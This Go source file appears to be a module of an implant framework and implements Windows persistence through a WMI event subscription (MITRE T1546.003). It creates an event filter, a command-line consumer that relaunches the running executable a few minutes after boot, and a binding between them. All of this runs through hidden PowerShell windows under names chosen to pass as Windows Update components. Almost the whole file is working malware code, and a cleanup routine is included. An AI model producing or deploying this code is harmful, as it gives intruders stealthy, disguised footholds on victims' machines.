//go:build windows
// +build windows

// persistence_wmi.go - WMI Event Subscription persistence
// Reference: MITRE ATT&CK T1546.003 (WMI Event Subscription)
//
// Creates a WMI event subscription that triggers the implant on system events.
// Uses __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding.
// This is a highly stealthy persistence mechanism.
//
// Note: This file is a standalone snippet for reference. The persistence.py
// module generates this code dynamically for template injection.

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// installWMIPersistence creates a WMI event subscription for persistence.
// Reference: MITRE ATT&CK T1546.003 (WMI Event Subscription)
func installWMIPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err // Silent failure, continue execution
	}

	// Escape path for WMI
	escapedPath := strings.ReplaceAll(exePath, `\`, `\\`)

	// Create WMI Event Filter - triggers on system startup (after ~4-5 minutes uptime)
	filterQuery := `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325`

	filterCmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -Command "$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='WindowsUpdateEventFilter';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='%s'}"`,
		filterQuery,
	)

	// Create CommandLineEventConsumer
	consumerCmd := fmt.Sprintf(
		`powershell.exe -WindowStyle Hidden -Command "$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='WindowsUpdateEventConsumer';CommandLineTemplate='%s'}"`,
		escapedPath,
	)

	// Create FilterToConsumerBinding
	bindingCmd := `powershell.exe -WindowStyle Hidden -Command "$Filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='WindowsUpdateEventFilter'\"; $Consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='WindowsUpdateEventConsumer'\"; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}"`

	// Execute commands silently
	for _, cmdStr := range []string{filterCmd, consumerCmd, bindingCmd} {
		cmd := exec.Command("cmd.exe", "/c", cmdStr)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err := cmd.Run()
		if err != nil {
			return err
		}
	}

	return nil
}

// removeWMIPersistence removes WMI event subscription.
func removeWMIPersistence() error {
	cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-Command",
		`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateEventFilter'" | Remove-WmiObject;`+
			`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateEventConsumer'" | Remove-WmiObject;`+
			`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*WindowsUpdateEventFilter*'} | Remove-WmiObject`)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
